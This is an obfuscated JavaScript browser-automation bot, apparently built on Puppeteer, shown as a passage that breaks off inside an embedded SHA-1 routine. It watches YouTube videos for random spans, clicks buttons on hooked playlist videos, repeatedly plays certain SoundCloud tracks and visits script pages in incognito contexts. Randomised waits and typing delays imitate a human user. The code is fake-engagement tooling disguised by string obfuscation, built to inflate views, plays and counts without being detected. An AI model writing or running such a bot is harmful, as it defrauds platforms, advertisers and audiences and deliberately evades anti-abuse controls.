const X = b,
  W = d,
  V = c;

function a() {
  const bl = [
    'W4auvCkuAmoRg8okW6X1',
    'CMvJDa',
    'nKGRCaPyWOxdQ2JdVG',
    'DX1KW6jkW57cImodahS',
    'moomoo.io\x20',
    'bytes',
    'zwfZEwzVCMSUBW',
    'bmoFW5ZdUt9eWOLpWQZcMq',
    '44lRVYQ38E',
    'cCkAps/cPSklAmotWQCA',
    'z290BW',
    'WRpdVcFcImkMWPukWQukWR0',
    'WPmwWOldOW',
    'x19MAwXS',
    'geKQ',
    '7%81%B5',
    'ss-bar',
    'Ahr0Chm6lY9NCG',
    '2Dx76lD8Sc',
    'z09vug5Ky2O3EG',
    '\x20Chrome/10',
    'WQ3dNmkUFhFcR2a',
    'e/moomoo.i',
    'Ahr0Chm6lY93DW',
    'rSoZWRVdP2VcKx/dS8kMWOi',
    '-fundament',
    'obNdNmkwkhyagHuR',
    'c1/dLe7dGSomoNhcT8kw',
    'https://gr',
    'AvD6zxPgv3bvnW',
    'd8o8W7RdOHurWPCZW7lcSa'
  ];
  a = function() {
    return bl;
  };
  return a();
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1f35 * -0x1 + 0x7cc + 0x6 * -0x680))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1fe8 + -0xb85 + -0x11 * 0x133), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x2954 + -0x300d * -0x4 + -0x9b2 * 0xc + (0x4ab * 0x5 + -0x371 * 0x10 + 0x5a51) * random()) : await standardWaitForNetIdle(f), await wait(0x20e2 + 0x64c + 0x1f7 * -0xa + (0x24d5 + -0x2 * 0x139a + -0x1 * -0x296f) * random()), 0x22f7 * 0x1 + 0xcf4 + -0x2fea;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xb3f * 0x1 + -0x97e + 0x6f * 0x29), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xf70 + -0x2366 + 0x32d7;
}
async function randomWait() {
  return await wait(-0x20 * 0x94 + -0x1 * 0x43 + 0x264b + (-0x78d + -0x429 + 0x1f3e) * random()), 0x2d * -0xa3 + 0x1517 + 0x1 * 0x791;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xc * -0xef + -0x1ee + -0x4a3 * 0x2);
    let h = e[f];
    if (b['eJiqpI'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x2bd * -0x9 + -0x15e4 + 0x2e89, s, t, u = 0x1942 * 0x1 + -0x1724 + 0x1 * -0x21e; t = n['charAt'](u++); ~t && (s = r % (0xc41 + 0x1 * -0x1fd9 + -0x5 * -0x3ec) ? s * (-0x33 * 0xac + 0x34d * -0x7 + 0x399f) + t : t, r++ % (-0x131e * -0x2 + -0x3 * 0x823 + 0x1f9 * -0x7)) ? p += String['fromCharCode'](0x230d + 0x5 * -0x473 + -0xbcf & s >> (-(0x1e * -0x29 + 0xa35 + -0x565) * r & -0xa * -0x232 + 0x5 * -0xb3 + 0x16b * -0xd)) : -0xa * 0xb6 + 0x52a * -0x3 + 0x169a) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1777 + 0x1430 + -0x2ba7, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1f35 + -0x1347 + -0xa * -0x50e))['slice'](-(0x846 + -0x409 + -0x43b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1ba3 + -0x1db4 + 0x831 * 0x7,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1 * 0x1160 + -0x66a + 0xaf6 * -0x1; u < 0x1416 + -0x35f * 0xb + 0x10f * 0x11; u++) {
          p[u] = u;
        }
        for (u = 0x1 * -0x211b + -0xf0a + -0x9a1 * -0x5; u < -0x1d53 + 0xe3b + -0xa * -0x19c; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xcc8 + -0x1117 + 0x1edf), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x5e7 * -0x1 + 0x98f + 0xd * -0x48, q = -0x2052 + 0xa33 + 0x161f;
        for (let v = -0x2 * 0xbd5 + -0x167 * 0x5 + 0x1ead; v < n['length']; v++) {
          u = (u + (0x1 * 0x2109 + -0x2682 + 0x2 * 0x2bd)) % (0x1 * 0x201b + -0x1 * -0xa11 + -0x1f * 0x154), q = (q + p[u]) % (0xef5 * -0x2 + -0x4 * 0x53 + 0x2036), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x10 * 0x22d + -0x871 + 0x2c41)]);
        }
        return t;
      };
      b['pCIjvs'] = m, c = arguments, b['eJiqpI'] = !![];
    }
    const j = e[0x3 * 0xc3b + -0x1c * -0xc7 + -0x49 * 0xcd],
      k = f + j,
      l = c[k];
    return !l ? (b['DMZifv'] === undefined && (b['DMZifv'] = !![]), h = b['pCIjvs'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x167 * -0x3 + 0x21e5 + -0x1db0, 0x146 * 0x19 + -0x18b3 + -0x71c), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xa799 + -0x7f * -0x1 + 0x4248) * getRandomInt(0xe3b + -0xc * 0x8d + -0x79d, -0x1117 + -0x1956 + 0x2a72), h)), -0x98f * -0x1 + 0x4 * 0x295 + -0x13e2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = d,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + R(0x10)))['pop']()['ariaValueT' + 'ext'],
      j = 0xa33 + -0x26e9 + 0x1cb6;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x703 + -0x257 * -0x5 + -0x4af]['split']('\x20');
    for (let k = 0x1 * 0x2109 + -0x2682 + 0x3 * 0x1d3; k < i['length']; k += 0x1 * 0x201b + -0x1 * -0xa11 + -0xe * 0x303)
      j += i[k] * h[i[k + (0xef5 * -0x2 + -0x4 * 0x53 + 0x1f37)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x10 * 0x22d + -0x871 + 0x2b47)['map'](l => Array['from'](l['children']))['flat'](0x3 * 0xc3b + -0x1c * -0xc7 + -0x74 * 0x81)['map'](l => l['childNodes'][0x60 * -0x2d + 0x1 * 0x151b + -0x43a]['childNodes'][-0x15f * -0xb + 0x6fc + -0x1611]['childNodes'][-0x1e6b * -0x1 + -0x147d + -0x21 * 0x4d]['childNodes'][0x1 * 0xd43 + 0x6e * -0x4f + -0x3 * -0x6e5]['childNodes'][-0x746 + 0x22bd + -0x1b76]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1df4 + -0x1 * -0x1c55 + 0x587, -0x14f9 + 0xcd + 0x27b4)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x45af + 0x46b + 0x7bdc);
  const h = await getMaxTime(f),
    i = Math['min']((0x3f1b + -0x1 * -0x10f9d + -0x6458) * getRandomInt(0x249b + -0x6a * -0x40 + -0x3f19, 0x1ab9 + -0x446 * 0x1 + -0x3 * 0x77a), h);
  return await wait(i), 0xb * 0x62 + -0x27c + -0x31 * 0x9;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x22 * 0xe5 + -0x971 + -0xd49 * -0x3]['children'][0x16 + -0x23 * 0xe3 + 0x1ef3]['children'][0x1 * 0x55d + -0x61f * -0x2 + -0x1 * 0x119b]['children'][-0x2563 + 0x304 * 0xb + 0x1 * 0x437]['children'][-0x119f * 0x1 + 0x1 * -0x3b6 + 0x1555]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1333 * -0x2 + -0x418 * 0x4 + -0x3 * 0x757;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xc * -0xef + -0x1ee + -0x4a3 * 0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1bf6 + 0x119 * -0x1 + -0x1a79 + (-0x29 * -0xa3 + -0x1ae * -0xb + -0x1 * 0x2c63) * random()
  }), await wait(0x14 * 0x172 + 0x1127 + -0x2c1b * 0x1 + (0x1 * 0x262b + 0x13 + -0x2512) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1745 + -0x694 + 0x1 * -0x10af]['childNodes'][-0x3d9 * -0x5 + 0x65 * 0x4 + 0x8 * -0x29a]['childNodes'][-0x648 * -0x3 + -0x1 * -0x19b6 + -0x2c8d]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x3e6 * 0x6 + 0x5 * 0x34 + -0x821 * 0x3]['childNodes'][0x42a * 0x7 + -0x255 + -0x1ad1]['childNodes'][-0x834 + -0x1a37 + 0x226d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x1e17 * -0x1 + 0x592 * -0x6 + 0x3f84),
          r = -0xc05 * -0x3 + 0x8 * -0x2a1 + -0xf07;
        for (let u = 0xdd5 + 0x19f1 + -0x27c6; u < q['length']; u += 0xed * -0x22 + 0x35 * -0x29 + 0x471 * 0x9)
          r += q[u] * k[q[u + (0x9 * 0x259 + -0x1662 + 0x142)]];
        return r;
      }(n);
  });
  await wait((0x3 * -0x13bf + 0x3d12 + 0xb * 0x529) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x16a3b * -0x1 + -0x106 * -0x3a + 0x2193f) * getRandomInt(-0x11e8 + -0x7 * 0x4bd + -0x1 * -0x3314, 0x2290 + 0x2389 + -0x460f), h + (0x146b + -0x1231 + 0x114e));
  return await wait(i), -0x1aa4 + -0x104d + 0x2e * 0xef;
}
async function keyWatch(f) {
  const S = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x5 * 0x313 + -0x13 * 0x191 + 0x35 * 0xda), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + S(0xd));
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xd52 + 0x94d + 0x3 * 0x53f + (0x42 * -0x4a + -0x3 * -0x17 + -0x5 * -0x48b) * Math['random']());
    });
  }, 0x536 + 0x2d9a + -0x1778);
  await wait(-0x8cf40 + 0x2c5 * -0x91 + 0xef4b5 * 0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1df7 + 0x1a997 + -0xdd2e) * getRandomInt(0x3 * 0xc33 + -0x1998 + -0x1 * 0xafd, 0x120e * -0x2 + 0x8b + 0x23aa)), clearInterval(h), -0x597 + 0x672 + -0xda;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x15ef + 0x1c8c + -0x327b * 0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x3a * -0x5 + 0x2 * 0xf6b + -0x1ff7;
    await randomWait();
  }
  return -0x14ad * -0x1 + -0x16c9 + 0x21d;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1c38 + 0x6ed + -0x2325 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1776 + 0xeb * 0xd + -0x2365 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xb76 + -0x10a * -0x21 + -0x3ce * 0x6 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x7b5 * -0x2 + -0x1c33 + 0xcc9;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x3 * 0x3e46 + 0x14266 + 0x2834 + getRandomInt(0x3e69 + 0x3 * 0x107e + -0x354b, 0x69bf * -0x1 + 0xe76c + -0x87d));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x6ec * -0x4 + 0x1479 + -0xe * -0x84), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x9ca + -0x5f9 + 0xfc3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2cd + -0x3 * 0x14b + -0xbe * -0x9, -0x184a + -0x6a6 + 0x1f22)), v['includes']('script-des' + 'cription') ? (log('p1'), await s[T(0xa)](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x57 * -0x45 + -0x2 * 0xf51 + -0x1 * -0xeff + floor((-0x1 * -0x17cb + -0x1f9a + 0xbb7 * 0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x8 * 0x172c9850 + 0x5 * -0x1ee7826a + 0x1d3ea4e92),
          0x78d525 + -0x20 * -0x3c48e + -0x3a87b * 0x1f,
          -0xe060 + -0x7143 + 0x1d1a3,
          -0x2b1 + 0x1 * -0x1d41 + 0x2072
        ], y = [
          -0xec3 + -0x148f * 0x1 + 0x236a,
          -0xc72 + 0x1603 + -0x1 * 0x981,
          -0x16de * -0x1 + -0xa3d + -0xc99,
          -0x1 * 0x1b91 + -0x1 * -0x2b7 + 0x18da
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1 * -0x449 + 0x43e + 0xc)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1e7a + -0x25d8 + 0x4452; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x42b * 0x1 + 0x19f9 + 0x15ce * -0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1f1d + -0x1 * -0xf3e + -0x2e5b] = A[0x2b + -0x9a1 + 0x986] = A[-0x1733 * 0x1 + 0x3 * -0xba7 + 0x3a29] = A[-0x52d + 0x172d * 0x1 + -0x11fe] = A[0x1 * -0x9f + -0xe6e + 0xf10] = A[-0x85e + -0x1 * -0x1447 + -0x261 * 0x5] = A[-0x3a2 + 0x1373 + 0xc * -0x151] = A[0xa3 * 0x15 + 0x2 * 0xe2 + -0xf1d] = A[0x134b + 0x22e1 + -0x3625] = A[0x26fe + 0x3 * 0x6e + -0x2840] = A[0x1029 + 0x1942 + 0x2 * -0x14b1] = A[-0xc5 * -0x1 + 0x135d + -0x1418] = A[-0x1 * -0x2651 + -0x1 * 0xc8e + 0x1 * -0x19b8] = A[-0x1943 + 0x14e4 + 0x46b] = A[0x1b7 * -0x1 + -0x5 * 0x3b3 + 0x15 * 0xf7] = A[0x183d + 0x2089 + 0x6 * -0x974] = A[0x4ae * -0x7 + -0x23e5 + 0x44b6] = 0x58f * -0x1 + 0x11 * 0x8f + -0x3f0, this['blocks'] = A) : this['blocks'] = [
                0x23f9 + 0x10af + -0x34a8,
                0x180 * 0x17 + -0x2 * 0xfa1 + -0x19f * 0x2,
                0x1b97 + -0x15b + -0x1a3c,
                -0x4 * -0x1a3 + 0x2016 + -0x26a2,
                -0x4 * -0x8be + 0x156c + 0x12cc * -0x3,
                -0x1 * 0xa3a + -0x5 * -0x3d3 + -0x8e5,
                0x35b * -0x9 + 0xddd + 0x1056,
                -0x1bbc + -0x3a9 + 0x1f65,
                -0x1c9 + 0x2b0 + 0xe7 * -0x1,
                -0x1 * 0x21df + -0x22c1 + 0xb7 * 0x60,
                0x1 * 0x2681 + 0x186 + -0x2807,
                0x102c + -0x55 * -0x5 + -0x11d5,
                -0x2f7 + 0x2002 + -0x1d0b,
                -0xb0 + 0x7 * 0x186 + -0x9fa,
                0x209c + -0x594 + 0xa * -0x2b4,
                0x2444 + -0x1023 + 0x1 * -0x1421,
                0xf83 + 0x1 * -0x22e3 + 0x1360
              ], this['h0'] = 0x9fbaf481 + 0x2 * 0x646eb05b + -0x2ae33309 * 0x6, this['h1'] = 0x12bf2330c * 0x1 + -0x7ad817 * 0x1cd + -0x4bb64 * -0x220a, this['h2'] = -0xae23b1ff * -0x1 + 0xfb293256 + 0x356bd * -0x51a3, this['h3'] = 0x1033f957 + 0x505 * 0x5146c + -0x631 * 0x41e8d, this['h4'] = -0x3e82f52 * -0x8 + 0x14e762a0 * 0xb + -0x415fd580, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xf0 * 0x10 + 0x220f * 0x1 + -0x13 * 0x295, this['finalized'] = this['hashed'] = -0x5 * -0x1e5 + -0x1a2a + -0x10b1 * -0x1, this['first'] = -0x5 * 0x763 + 0xb51 * -0x1 + 0x3041;
            }
            ['update'](J) {
              const U = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x2051 + -0x278 * -0xe + -0x23f, O = J['length'] || -0x23a3 + 0x13 * 0x17f + 0x736, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1 * -0x20ad + 0x9 * 0x1fc + -0xed1 * -0x1, P[-0x1f25 + 0xb7 + 0x1e6e] = this['block'], P[0x1 * 0x135e + 0x1c30 + -0x2f7e] = P[-0x1c65 + -0x2192 + 0x8 * 0x7bf] = P[-0x1ae0 + -0x1c * -0x1 + 0x1ac6] = P[-0x172b + 0x183e + -0x110] = P[0x25b8 + 0x1 * 0x2336 + 0x11 * -0x44a] = P[0xcf * 0x29 + -0x388 * -0x8 + -0x3d62] = P[0x373 + 0xa9 * 0x5 + -0x6ba] = P[-0xf * -0x161 + 0x73c + -0x4 * 0x6f9] = P[0xd6d + -0x6 * 0x539 + 0x11f1 * 0x1] = P[0x4 * 0x6b8 + -0x336 + -0x17a1 * 0x1] = P[-0x91 * -0x20 + -0x189a + 0x684] = P[0x1711 * -0x1 + 0x25 * 0x67 + -0x5 * -0x1a5] = P[-0x1f * 0x13a + 0x682 + 0x1f90] = P[-0x186a + -0x65a + -0x17 * -0x157] = P[0x4a * -0x80 + 0x285 * -0xb + 0x40c5] = P[-0x2b * -0x92 + -0xdd * -0x12 + -0x31 * 0xd1] = 0x1d55 + 0xe9f + -0x3a * 0xc2), K) {
                    for (N = this['start']; M < O && N < 0x25 * 0xca + -0x544 + 0x1b1 * -0xe; ++M)
                      P[N >> -0x5 * -0x59d + -0x10b * -0x4 + 0x25 * -0xdf] |= J[M] << y[-0x1 * 0x1add + 0x1ac9 + -0x1 * -0x17 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x8d * 0x7 + -0x20a + -0x191; ++M)
                      (L = J['charCodeAt'](M)) < 0x6e5 + -0x1c4 * 0xa + 0xb43 ? P[N >> 0x1e11 + 0x45e + -0x226d] |= L << y[0x2 * 0x115a + 0x1 * 0x1969 + -0x3c1a & N++] : L < 0x735 + -0x16 * 0x61 + 0x921 ? (P[N >> 0x184e + 0x6f * 0x49 + -0x37f3] |= (-0x571 + 0x1 * -0x52a + -0x13 * -0x99 | L >> -0x45 + 0x13 * -0x85 + 0x1 * 0xa2a) << y[-0xa1e * -0x3 + 0x1 * 0xa0a + -0x2861 & N++], P[N >> -0xf * 0x53 + 0x3 * -0x52 + 0x5d5] |= (0x15 * -0x31 + -0x1ac2 + 0x1f47 | -0x169c + 0xff5 + 0x6e6 & L) << y[0x2201 * 0x1 + 0x45f + 0x7 * -0x57b & N++]) : L < 0x1091d + -0xd330 + 0xa213 || L >= 0x1487 + -0xc4a6 + -0x7 * -0x3929 ? (P[N >> -0x2432 * 0x1 + -0x1156 + 0xb2 * 0x4d] |= (-0x1c3d + -0x148a * 0x1 + 0x31a7 | L >> -0x22e7 * 0x1 + -0xe34 + -0x1 * -0x3127) << y[-0x2 * 0x194 + 0x56 * -0x43 + 0x19ad & N++], P[N >> -0x81b + 0x369 * -0xb + 0x50 * 0x92] |= (-0x1e2 + 0x448 + -0x1e6 | L >> -0x8 * 0x22d + 0x1c9 * -0x1 + 0x1337 & -0x1 * -0x1049 + -0x6 * -0x4eb + -0x2d8c) << y[0x19ee * -0x1 + -0xa11 + 0x2402 & N++], P[N >> 0x581 + 0xc1 + -0x8 * 0xc8] |= (0x16c5 * 0x1 + -0x1f9f + -0x13 * -0x7e | 0x11 * 0x11a + -0x9b7 * 0x1 + 0x2ec * -0x3 & L) << y[0x180 * 0x13 + -0x1e37 + -0x1 * -0x1ba & N++]) : (L = 0x13278 + -0x8e * 0x1d5 + 0x68d7 * 0x2 + ((0x12 * 0x176 + 0x2517 + -0x3b64 & L) << -0x24ac + -0x10 + -0x24c6 * -0x1 | -0x317 * 0xa + 0x17e9 + 0xafc & J['charCodeAt'](++M)), P[N >> -0x2f * 0xe + -0x3cb * 0x3 + 0xdf5] |= (0x98 * 0xd + 0x232e + 0x14fb * -0x2 | L >> -0x1d37 + 0x21b1 + -0xc * 0x5e) << y[0xfb5 + -0x25a2 + -0x4e * -0x48 & N++], P[N >> -0x109b * 0x2 + 0x379 + -0x1dbf * -0x1] |= (0x691 * 0x1 + 0x25e5 + -0x2bf6 | L >> -0x1e66 + 0x1ff * 0x2 + 0x2 * 0xd3a & 0x1ee4 * 0x1 + 0x1019 + 0x1 * -0x2ebe) << y[-0xe2c + -0xd59 + -0x1b88 * -0x1 & N++], P[N >> 0x1871 + -0x121 * 0xb + -0xc04] |= (-0x1155 + -0x3e5 * 0x3 + 0x1d84 | L >> -0x6 * 0x27c + -0x1a0 * 0x1 + 0x108e & 0x1 * 0x2577 + 0xe2d + -0xdf * 0x3b) << y[0x99 * -0x27 + -0x24a0 + 0x3bf2 & N++], P[N >> -0xb39 + -0x1a6f + 0x25aa] |= (0x2549 + 0x1 * -0x19db + -0xaee * 0x1 | -0x19 * 0x13c + 0x1d95 + 0x186 & L) << y[-0x698 + 0xdfa + -0x75f & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x82e + -0x1 * -0xcd4 + -0x233 * 0x2 ? (this['block'] = P[-0x611 + 0x241e + 0x1dfd * -0x1], this['start'] = N - (-0x85 * 0x19 + -0x1 * -0x236d + 0xa * -0x238), this['hash'](), this['hashed'] = -0x1bc4 + 0x17c9 + -0x44 * -0xf) : this['start'] = N;
                }
